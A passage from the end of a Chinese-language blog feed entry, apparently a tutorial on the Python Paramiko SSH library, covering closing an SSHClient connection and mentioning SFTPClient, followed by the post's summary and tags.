punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p><img src="/images/2/ifconfig.jpg" alt="ifconfig"><br>这样就得到了返回值</p><h3 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h3><p>不要总是依赖上下文, 要学会手动释放资源关闭连接</p><pre class=" language-python"><code class="language-python">client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>到这里, <code>paramiko</code>的<code>SSHClient</code>用法就结束了，<code>paramiko</code>还支持<code>SFTPClient</code>等其他远程操作, 自己发掘吧~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Paramiko是一个Python的远程操作库，可以进行&lt;code&gt;SSH&lt;/code&gt;, &lt;code&gt;SFTP&lt;/code&gt;等远程连接操作. 来学习学习怎么使用吧&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://helianthus.top/categories/Python/"/>
    
    
      <category term="python" scheme="https://helianthus.top/tags/python/"/>
    
      <category term="paramiko" scheme="https://helianthus.top/tags/paramiko/"/>
    
  </entry>
  
</feed>
